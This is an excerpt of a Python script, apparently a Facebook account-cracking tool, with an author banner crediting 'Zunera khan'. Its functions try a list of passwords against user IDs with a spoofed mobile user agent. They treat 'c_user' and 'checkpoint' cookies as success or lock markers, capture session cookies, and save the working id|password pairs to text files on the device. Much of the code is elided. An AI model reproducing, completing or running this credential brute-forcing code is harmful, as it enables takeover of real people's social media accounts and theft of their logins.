...
----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m Zunera "  IS HERE
\033[0;93m[•] FACEBOOK. :. Zunera khan 
\033[1;37m[-] GITHUB    :\033[1;32m Zunera
...
def menu():
			...
			if anees in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/Zunera-khan-OK.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mZunera-khan\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[Zunera-khan-OK-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/Zunera-khan-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[Zunera-khan-OK-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Zunera-khan-OK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[Zunera-khan-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/Zunera-khan-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[Zunera-khan-OK-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Zunera-khan-OK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[Zunera-khan-OK] '+cid+' | '+ps+'\033[1;32m')
				open('Zunera-khan-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[Zunera-CP] '+uid+' | '+ps+'\33[0;97m')
				open('Zunera-khan-OK-cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
